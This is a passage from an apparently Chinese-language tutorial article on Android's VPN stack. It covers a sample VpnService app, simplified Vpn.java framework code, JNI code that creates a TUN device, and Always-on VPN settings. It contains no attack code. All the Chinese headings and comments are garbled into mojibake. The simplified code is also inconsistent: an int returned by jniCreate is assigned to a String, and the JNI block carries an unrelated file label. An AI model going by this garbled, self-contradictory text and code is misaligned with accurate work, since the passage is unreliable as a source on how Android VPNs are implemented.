â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚         â†“                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  Builder       â”‚ â† é…ç½®VPNå‚æ•°       â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                         â”‚
â”‚  Frameworkå±‚                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  Vpn.java      â”‚ â† VPNç®¡ç†æ ¸å¿ƒ       â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚         â†“                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚ConnectivitySrv â”‚ â† ç½‘ç»œè¿æ¥ç®¡ç†      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                         â”‚
â”‚  Nativeå±‚                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  Netd          â”‚ â† è·¯ç”±é…ç½®          â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                         â”‚
â”‚  Kernelå±‚                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”‚
â”‚  â”‚  TUN Driver    â”‚ â† è™šæ‹Ÿç½‘å¡          â”‚
â”‚  â”‚  /dev/tun      â”‚                     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚
â”‚                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-23">2.2 VpnServiceåº”ç”¨å±‚å®ç°</h3>
<h4 data-id="heading-24">åŸºç¡€VPNç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åº”ç”¨å®ç°VPNæœåŠ¡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyVpnService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">VpnService</span> {

    <span class="hljs-keyword">private</span> ParcelFileDescriptor mInterface;
    <span class="hljs-keyword">private</span> Thread mVpnThread;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> startId)</span> {
        <span class="hljs-comment">// 1. å‡†å¤‡VPN (å¼¹å‡ºç”¨æˆ·æˆæƒå¯¹è¯æ¡†)</span>
        <span class="hljs-type">Intent</span> <span class="hljs-variable">prepare</span> <span class="hljs-operator">=</span> VpnService.prepare(<span class="hljs-built_in">this</span>);
        <span class="hljs-keyword">if</span> (prepare != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// éœ€è¦ç”¨æˆ·æˆæƒ</span>
            startActivity(prepare);
            <span class="hljs-keyword">return</span> START_NOT_STICKY;
        }

        <span class="hljs-comment">// 2. å»ºç«‹VPNè¿æ¥</span>
        mVpnThread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-built_in">this</span>::setupVpn);
        mVpnThread.start();

        <span class="hljs-keyword">return</span> START_STICKY;
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setupVpn</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3. é…ç½®VPNå‚æ•°</span>
            <span class="hljs-type">Builder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>();
            builder
                <span class="hljs-comment">// è®¾ç½®VPNåœ°å€</span>
                .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)

                <span class="hljs-comment">// è®¾ç½®è·¯ç”± (æ‰€æœ‰æµé‡é€šè¿‡VPN)</span>
                .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)

                <span class="hljs-comment">// è®¾ç½®DNS</span>
                .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
                .addDnsServer(<span class="hljs-string">"8.8.4.4"</span>)

                <span class="hljs-comment">// è®¾ç½®MTU</span>
                .setMtu(<span class="hljs-number">1500</span>)

                <span class="hljs-comment">// è®¾ç½®ä¼šè¯åç§°</span>
                .setSession(<span class="hljs-string">"MyVPN"</span>)

                <span class="hljs-comment">// é…ç½®å…è®¸/ç¦æ­¢çš„åº”ç”¨</span>
                .addAllowedApplication(<span class="hljs-string">"com.example.app"</span>)
                .addDisallowedApplication(<span class="hljs-string">"com.example.excluded"</span>);

            <span class="hljs-comment">// 4. å»ºç«‹TUNæ¥å£</span>
            mInterface = builder.establish();
            <span class="hljs-keyword">if</span> (mInterface == <span class="hljs-literal">null</span>) {
                Log.e(TAG, <span class="hljs-string">"Failed to establish VPN"</span>);
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-comment">// 5. è·å–æ–‡ä»¶æè¿°ç¬¦</span>
            <span class="hljs-type">FileDescriptor</span> <span class="hljs-variable">fd</span> <span class="hljs-operator">=</span> mInterface.getFileDescriptor();

            <span class="hljs-comment">// 6. è¯»å†™TUNè®¾å¤‡</span>
            handleTraffic(fd);

        } <span class="hljs-keyword">catch</span> (Exception e) {
            Log.e(TAG, <span class="hljs-string">"VPN setup failed"</span>, e);
        }
    }

    <span class="hljs-comment">// å¤„ç†TUNè®¾å¤‡æµé‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTraffic</span><span class="hljs-params">(FileDescriptor fd)</span> {
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(fd);
        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fd);

        <span class="hljs-type">byte</span>[] packet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">32767</span>];

        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 1. ä»TUNè®¾å¤‡è¯»å–IPæ•°æ®åŒ…</span>
                <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> in.read(packet);
                <span class="hljs-keyword">if</span> (length &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-comment">// 2. è§£æIPåŒ…</span>
                    <span class="hljs-type">IpPacket</span> <span class="hljs-variable">ipPacket</span> <span class="hljs-operator">=</span> parseIpPacket(packet, length);

                    <span class="hljs-comment">// 3. åŠ å¯†/å°è£…æ•°æ®</span>
                    <span class="hljs-type">byte</span>[] encrypted = encrypt(ipPacket);

                    <span class="hljs-comment">// 4. å‘é€åˆ°VPNæœåŠ¡å™¨</span>
                    sendToVpnServer(encrypted);
                }

                <span class="hljs-comment">// 5. ä»VPNæœåŠ¡å™¨æ¥æ”¶æ•°æ®</span>
                <span class="hljs-type">byte</span>[] received = receiveFromVpnServer();
                <span class="hljs-keyword">if</span> (received != <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// 6. è§£å¯†/è§£å°è£…</span>
                    <span class="hljs-type">byte</span>[] decrypted = decrypt(received);

                    <span class="hljs-comment">// 7. å†™å›TUNè®¾å¤‡</span>
                    out.write(decrypted);
                }

            } <span class="hljs-keyword">catch</span> (IOException e) {
                <span class="hljs-keyword">break</span>;
            }
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (mVpnThread != <span class="hljs-literal">null</span>) {
            mVpnThread.interrupt();
        }
        <span class="hljs-keyword">if</span> (mInterface != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                mInterface.close();
            } <span class="hljs-keyword">catch</span> (IOException e) {
                <span class="hljs-comment">// Ignore</span>
            }
        }
        <span class="hljs-built_in">super</span>.onDestroy();
    }
}
</code></pre>
<h4 data-id="heading-25">VPNé…ç½®è¯¦è§£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VpnConfigExample</span> {

    <span class="hljs-comment">// é…ç½®1ï¼šå…¨å±€VPN (æ‰€æœ‰æµé‡)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupGlobalVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)      <span class="hljs-comment">// æ‰€æœ‰IPv4æµé‡</span>
            .addRoute(<span class="hljs-string">"::"</span>, <span class="hljs-number">0</span>)           <span class="hljs-comment">// æ‰€æœ‰IPv6æµé‡</span>
            .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
            .establish();
    }

    <span class="hljs-comment">// é…ç½®2ï¼šåˆ†æµVPN (ä»…ç‰¹å®šç½‘æ®µ)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupSplitVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"192.168.0.0"</span>, <span class="hljs-number">16</span>)   <span class="hljs-comment">// ä»…ä¼ä¸šå†…ç½‘</span>
            .addRoute(<span class="hljs-string">"10.0.0.0"</span>, <span class="hljs-number">8</span>)       <span class="hljs-comment">// ä»…ç§æœ‰ç½‘ç»œ</span>
            .addDnsServer(<span class="hljs-string">"10.0.0.1"</span>)
            .establish();
    }

    <span class="hljs-comment">// é…ç½®3ï¼šåº”ç”¨çº§VPN (ä»…ç‰¹å®šåº”ç”¨)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupPerAppVpn</span><span class="hljs-params">(VpnService service)</span>
            <span class="hljs-keyword">throws</span> PackageManager.NameNotFoundException {
        <span class="hljs-type">Builder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>);

        <span class="hljs-comment">// æ–¹å¼1ï¼šç™½åå•æ¨¡å¼ (åªæœ‰æŒ‡å®šåº”ç”¨èµ°VPN)</span>
        builder.addAllowedApplication(<span class="hljs-string">"com.example.secure"</span>);
        builder.addAllowedApplication(<span class="hljs-string">"com.example.banking"</span>);

        <span class="hljs-comment">// æ–¹å¼2ï¼šé»‘åå•æ¨¡å¼ (æŒ‡å®šåº”ç”¨ä¸èµ°VPN)</span>
        <span class="hljs-comment">// builder.addDisallowedApplication("com.example.local");</span>

        <span class="hljs-keyword">return</span> builder.establish();
    }

    <span class="hljs-comment">// é…ç½®4ï¼šAlways-on VPN (ç³»ç»Ÿçº§æŒä¹…VPN)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupAlwaysOnVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)
            .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
            .setBlocking(<span class="hljs-literal">true</span>)  <span class="hljs-comment">// é˜»å¡æ¨¡å¼ï¼šVPNæ–­å¼€æ—¶é˜»æ­¢æ‰€æœ‰æµé‡</span>
            .establish();
    }
}
</code></pre>
<h3 data-id="heading-26">2.3 Frameworkå±‚VPNç®¡ç†</h3>
<p><strong>æºç ä½ç½®</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">packages/modules/Connectivity/service/src/com/android/server/connectivity/Vpn.java
</code></pre>
<h4 data-id="heading-27">Vpn.javaæ ¸å¿ƒå®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Vpn.java (ç®€åŒ–ç‰ˆ)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vpn</span> {

    <span class="hljs-comment">// VPNé…ç½®</span>
    <span class="hljs-keyword">private</span> VpnConfig mConfig;

    <span class="hljs-comment">// TUNæ¥å£åç§°</span>
    <span class="hljs-keyword">private</span> String mInterface;

    <span class="hljs-comment">// VPNç½‘ç»œ</span>
    <span class="hljs-keyword">private</span> Network mNetwork;

    <span class="hljs-comment">// VPN NetworkAgent</span>
    <span class="hljs-keyword">private</span> NetworkAgent mNetworkAgent;

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•ï¼šå»ºç«‹VPN</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> ParcelFileDescriptor <span class="hljs-title function_">establish</span><span class="hljs-params">(VpnConfig config)</span> {
        <span class="hljs-comment">// 1. æƒé™æ£€æŸ¥</span>
        enforceControlPermission();

        <span class="hljs-comment">// 2. åˆ›å»ºTUNè®¾å¤‡</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">interfaceName</span> <span class="hljs-operator">=</span> jniCreate(config.mtu);
        <span class="hljs-keyword">if</span> (interfaceName == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Failed to create TUN device"</span>);
        }
        mInterface = interfaceName;

        <span class="hljs-comment">// 3. é…ç½®TUNè®¾å¤‡åœ°å€</span>
        <span class="hljs-keyword">for</span> (LinkAddress address : config.addresses) {
            jniAddAddress(interfaceName, address.getAddress(),
                         address.getPrefixLength());
        }

        <span class="hljs-comment">// 4. é…ç½®è·¯ç”±</span>
        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Connection</span>();
        connection.interfaceName = interfaceName;
        connection.routes = config.routes;

        <span class="hljs-comment">// 5. é€šçŸ¥Netdé…ç½®è·¯ç”±</span>
        <span class="hljs-keyword">try</span> {
            mNetd.addVpnUidRanges(mInterface, config.allowedUidRanges);

            <span class="hljs-keyword">for</span> (RouteInfo route : config.routes) {
                mNetd.vpnAddRoute(mInterface, route);
            }
        } <span class="hljs-keyword">catch</span> (RemoteException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Netd error"</span>, e);
        }

        <span class="hljs-comment">// 6. è®¾ç½®DNS</span>
        <span class="hljs-keyword">try</span> {
            mNetd.setDnsServersForInterface(interfaceName,
                                           config.dnsServers,
                                           config.searchDomains);
        } <span class="hljs-keyword">catch</span> (RemoteException e) {
            <span class="hljs-comment">// ...</span>
        }

        <span class="hljs-comment">// 7. åˆ›å»ºNetworkAgent</span>
        agentConnect(config);

        <span class="hljs-comment">// 8. æ‰“å¼€TUNè®¾å¤‡æ–‡ä»¶æè¿°ç¬¦</span>
        <span class="hljs-type">ParcelFileDescriptor</span> <span class="hljs-variable">tun</span> <span class="hljs-operator">=</span> ParcelFileDescriptor.adoptFd(
            jniGetFd(interfaceName)
        );

        <span class="hljs-keyword">return</span> tun;
    }

    <span class="hljs-comment">// åˆ›å»ºNetworkAgent</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentConnect</span><span class="hljs-params">(VpnConfig config)</span> {
        <span class="hljs-comment">// æ„å»ºNetworkCapabilities</span>
        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCapabilities</span>();
        caps.addTransportType(NetworkCapabilities.TRANSPORT_VPN);
        caps.removeCapability(NET_CAPABILITY_NOT_VPN);

        <span class="hljs-keyword">if</span> (config.allowBypass) {
            caps.addCapability(NET_CAPABILITY_NOT_RESTRICTED);
        }

        <span class="hljs-comment">// æ„å»ºLinkProperties</span>
        <span class="hljs-type">LinkProperties</span> <span class="hljs-variable">lp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkProperties</span>();
        lp.setInterfaceName(mInterface);

        <span class="hljs-comment">// åˆ›å»ºNetworkAgent</span>
        mNetworkAgent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkAgent</span>(mContext, mLooper,
            <span class="hljs-string">"VPN"</span>, caps, lp, <span class="hljs-number">0</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkAgentConfig</span>(), <span class="hljs-built_in">this</span>) {

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNetworkUnwanted</span><span class="hljs-params">()</span> {
                <span class="hljs-comment">// VPNè¢«ç§»é™¤</span>
                Vpn.<span class="hljs-built_in">this</span>.onNetworkUnwanted();
            }
        };

        mNetworkAgent.register();
        mNetwork = mNetworkAgent.getNetwork();
    }

    <span class="hljs-comment">// JNIæ–¹æ³• - åˆ›å»ºTUNè®¾å¤‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">jniCreate</span><span class="hljs-params">(<span class="hljs-type">int</span> mtu)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">jniGetName</span><span class="hljs-params">(<span class="hljs-type">int</span> tun)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jniAddAddress</span><span class="hljs-params">(String interfaceName,
                                     String address, <span class="hljs-type">int</span> prefixLen)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">jniGetFd</span><span class="hljs-params">(String interfaceName)</span>;
}
</code></pre>
<h4 data-id="heading-28">JNIå±‚TUNè®¾å¤‡æ“ä½œ</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// frameworks/base/core/jni/android_net_LocalSocketImpl.cpp</span>

<span class="hljs-function"><span class="hljs-type">static</span> jint <span class="hljs-title">com_android_server_connectivity_Vpn_jniCreate</span><span class="hljs-params">(JNIEnv* env,
                                                          jobject <span class="hljs-comment">/* clazz */</span>,
                                                          jint mtu)</span> </span>{
    <span class="hljs-comment">// 1. æ‰“å¼€TUNè®¾å¤‡</span>
    <span class="hljs-type">int</span> tun = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/dev/tun"</span>, O_RDWR | O_NONBLOCK | O_CLOEXEC);
    <span class="hljs-keyword">if</span> (tun &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">jniThrowException</span>(env, <span class="hljs-string">"java/io/IOException"</span>,
                         <span class="hljs-string">"Cannot open TUN device"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// 2. é…ç½®TUNè®¾å¤‡</span>
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifreq</span> ifr;
    <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(ifr));
    ifr.ifr_flags = IFF_TUN | IFF_NO_PI;  <span class="hljs-comment">// TUNæ¨¡å¼ï¼Œæ— åè®®å¤´</span>
    <span class="hljs-built_in">strncpy</span>(ifr.ifr_name, <span class="hljs-string">"tun%d"</span>, IFNAMSIZ);

    <span class="hljs-comment">// 3. åˆ›å»ºTUNæ¥å£</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(tun, TUNSETIFF, &amp;ifr) &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">close</span>(tun);
        <span class="hljs-built_in">jniThrowException</span>(env, <span class="hljs-string">"java/io/IOException"</span>,
                         <span class="hljs-string">"Cannot configure TUN device"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// 4. è®¾ç½®MTU</span>
    <span class="hljs-keyword">if</span> (mtu &gt; <span class="hljs-number">0</span> &amp;&amp; mtu != ifr.ifr_mtu) {
        ifr.ifr_mtu = mtu;
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(tun, SIOCSIFMTU, &amp;ifr) &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">ALOGW</span>(<span class="hljs-string">"Cannot set MTU"</span>);
        }
    }

    <span class="hljs-keyword">return</span> tun;
}

<span class="hljs-comment">// æ·»åŠ IPåœ°å€åˆ°TUNæ¥å£</span>
<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">com_android_server_connectivity_Vpn_jniAddAddress</span><span class="hljs-params">(
        JNIEnv* env, jobject <span class="hljs-comment">/* clazz */</span>,
        jstring jInterfaceName, jstring jAddress, jint prefixLen)</span> </span>{

    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* interfaceName = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(jInterfaceName, <span class="hljs-literal">NULL</span>);
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* address = env-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(jAddress, <span class="hljs-literal">NULL</span>);

    <span class="hljs-comment">// ä½¿ç”¨netlinkæ·»åŠ åœ°å€</span>
    <span class="hljs-keyword">struct</span> {
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">nlmsghdr</span> n;
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifaddrmsg</span> ifa;
        <span class="hljs-type">char</span> buf[<span class="hljs-number">256</span>];
    } req;

    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(req));
    req.n.nlmsg_len = <span class="hljs-built_in">NLMSG_LENGTH</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> ifaddrmsg));
    req.n.nlmsg_type = RTM_NEWADDR;
    req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;

    req.ifa.ifa_family = AF_INET;  <span class="hljs-comment">// æˆ–AF_INET6</span>
    req.ifa.ifa_prefixlen = prefixLen;
    req.ifa.ifa_index = if_nametoindex(interfaceName);

    <span class="hljs-comment">// æ·»åŠ åœ°å€å±æ€§...</span>
    <span class="hljs-built_in">addattr_l</span>(&amp;req.n, <span class="hljs-built_in">sizeof</span>(req), IFA_LOCAL, address, <span class="hljs-number">4</span>);

    <span class="hljs-comment">// å‘é€åˆ°å†…æ ¸...</span>
    <span class="hljs-built_in">send_netlink_message</span>(&amp;req.n);

    env-&gt;<span class="hljs-built_in">ReleaseStringUTFChars</span>(jInterfaceName, interfaceName);
    env-&gt;<span class="hljs-built_in">ReleaseStringUTFChars</span>(jAddress, address);
}
</code></pre>
<h3 data-id="heading-29">2.4 Always-on VPN</h3>
<p><strong>Always-on VPN</strong>æ˜¯Android 7.0å¼•å…¥çš„åŠŸèƒ½ï¼Œç¡®ä¿è®¾å¤‡å§‹ç»ˆé€šè¿‡VPNè¿æ¥ã€‚</p>
<h4 data-id="heading-30">å·¥ä½œæœºåˆ¶</h4>
<pre><code class="hljs language-markdown" lang="markdown">Always-on VPNå¼€å¯å:

<span class="hljs-bullet">1.</span> ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨VPN
   â†’ æ— éœ€ç”¨æˆ·æ‰‹åŠ¨è¿æ¥

<span class="hljs-bullet">2.</span> VPNæ–­å¼€æ—¶é˜»æ­¢æ‰€æœ‰ç½‘ç»œè®¿é—®
   â†’ "Block connections without VPN"é€‰é¡¹

<span class="hljs-bullet">3.</span> VPNæœåŠ¡å´©æºƒæ—¶è‡ªåŠ¨é‡è¿
   â†’ ç”±ç³»ç»Ÿç›‘æ§å¹¶é‡å¯

<span class="hljs-bullet">4.</span> ä¸å…è®¸ç”¨æˆ·æ‰‹åŠ¨æ–­å¼€
   â†’ åªæœ‰ç®¡ç†å‘˜å¯ä»¥å…³é—­
</code></pre>
<h4 data-id="heading-31">é…ç½®Always-on VPN</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç³»ç»Ÿè®¾ç½® - é…ç½®Always-on VPN</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AlwaysOnVpnConfig</span> {

    <span class="hljs-comment">// è®¾ç½®Always-on VPN</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAlwaysOnVpn</span><span class="hljs-params">(Context context, String packageName,
                               <span class="hljs-type">boolean</span> lockdownEnabled)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-comment">// éœ€è¦CONTROL_ALWAYS_ON_VPNæƒé™ (ç³»ç»Ÿåº”ç”¨)</span>
        cm.setAlwaysOnVpnPackageForUser(
            UserHandle.myUserId(),
            packageName,
            lockdownEnabled,    <span class="hljs-comment">// æ˜¯å¦é˜»æ–­æ¨¡å¼</span>
            <span class="hljs-literal">null</span>                <span class="hljs-comment">// å…è®¸ç»•è¿‡çš„åº”ç”¨åˆ—è¡¨</span>
        );
    }

    <span class="hljs-comment">// æ£€æŸ¥Always-on VPNçŠ¶æ€</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAlwaysOnVpnEnabled</span><span class="hljs-params">(Context context)</span> {
        <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> context.getSystemService(
            ConnectivityManager.class);

        <span class="hljs-type">String</span> <span class="hljs-variable">vpnPackage</span> <span class="hljs-operator">=</span> cm.getAlwaysOnVpnPackageForUser(
            UserHandle.myUserId()
        );

        <span class="hljs-keyword">return</span> vpnPackage != <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h4 data-id="heading-32">Frameworkå®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Vpn.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">setAlwaysOnPackage</span><span class="hljs-params">(String packageName, <span class="hljs-type">boolean</span> lockdown,
                                  List&lt;String&gt; lockdownWhitelist)</span> {
    enforceControlPermissionOrInternalCaller();

    <span class="hljs-keyword">if</span> (packageName == <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// å…³é—­Always-on VPN</span>
        mAlwaysOn = <span class="hljs-literal">false</span>;
        mLockdown = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-comment">// éªŒè¯VPNåº”ç”¨</span>
    <span class="hljs-keyword">if</span> (!isVpnServicePreConsented(packageName)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// ä¿å­˜é…ç½®</span>
    mAlwaysOn = <span class="hljs-literal">true</span>;
    mLockdown = lockdown;
    mLockdownWhitelist = lockdownWhitelist;

    <span class="hljs-comment">// å¯åŠ¨VPN</span>
    startAlwaysOnVpn();

    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startAlwaysOnVpn</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. å¦‚æœå·²è¿æ¥ï¼Œä»€ä¹ˆéƒ½ä¸åš</span>
    <span class="hljs-keyword">if</span> (mNetworkAgent != <span class="hljs-literal">null</span> &amp;&amp; mNetworkAgent.isConnected()) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 2. å¯åŠ¨VPNæœåŠ¡</span>
